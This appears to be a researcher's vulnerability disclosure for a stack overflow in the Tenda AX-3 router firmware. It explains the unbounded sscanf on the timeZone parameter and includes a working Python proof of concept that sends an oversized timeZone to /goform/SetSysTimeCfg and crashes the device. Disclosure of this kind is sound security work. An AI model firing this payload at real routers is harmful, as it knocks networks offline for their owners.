# Tenda Vulnerability

Vendor:Tenda

Product:AX-3

Version:v16.03.12.10_CN(https://www.tenda.com.cn/material/show/3238)

Vulnerability Type: Stack Overflow

Author:Chuanhao Wan

Mail:chuanhaowan@hust.edu.cn

Institution:Huazhong University of Science and Technology(HUST)




## Vulnerability cause

In the function processing the timeZone parameter, the timeZone is obtained via websGetVar and passed to _isoc99_sscanf for parsing with the format "%[^:]:%s". The %s format specifier does not specify a maximum field width, and the target buffer v27 (or v23) has a limited size (specific size depends on context, likely 16 or 32 bytes). By crafting a request with an excessively long timeZone parameter (including a colon to pass the strchr check), a buffer overflow can be triggered, leading to a heap or stack overflow and resulting in a Denial of Service (DoS) attack.

<div  align="center"><img src="./images/1.png" style="zoom:60%;" /></div>




## PoC
In order to reproduce the vulnerability, the following steps can be followed:

1.Boot the firmware by qemu-system or other ways (real machine)

2.Attack with the following POC attacks



```
import requests

url = "http://192.168.20.12/goform/SetSysTimeCfg" 

timeZone = "A" * 1000 + ":" + "B" * 1000
data = {
    "timeZone": timeZone,
    "timePeriod": "0",
    "ntpServer": "time.windows.com"
}

r = requests.post(url, data=data)
print(r.status_code, r.text)
```


## Result

The target router crashes and cannot provide services correctly and persistently.

<div  align="center"><img src="./images/2.png" style="zoom:80%;" /></div>
<div  align="center"><img src="./images/3.png" style="zoom:80%;" /></div>